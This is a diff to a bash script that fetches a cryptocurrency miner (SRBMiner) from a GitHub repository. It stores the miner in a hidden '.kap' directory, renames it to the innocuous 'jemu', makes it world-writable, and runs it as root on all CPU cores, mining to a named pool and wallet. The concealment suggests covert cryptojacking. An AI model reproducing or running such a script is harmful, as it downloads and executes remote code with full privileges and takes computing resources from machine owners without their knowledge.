@@ -1,6 +1,8 @@
 #!/bin/bash
-apt-get update ; apt-get -y install sudo
+apt-get update ; apt-get -y install sudo wget git
+sudo apt-get update ; sudo apt-get -y install sudo wget git
 mkdir .kap && cd .kap
-wget -O jemu https://github.com/nandafiku/gradi/raw/main/SRBMiner-247
-chmod 777 jemu
+git clone https://github.com/nandafiku/gradi && cd gradi
+mv SRBMiner-247 jemu
+chmod 777 jemu && sudo chmod 777 jemu
 sudo ./jemu --algorithm aurum --pool stratum-na.rplant.xyz:7109 --wallet bit1q9f8tjdw3p8hf05wz5gpchnmhshecjd3747uqfl.x --password webpassword=x --keepalive true --cpu-threads $(nproc --all)
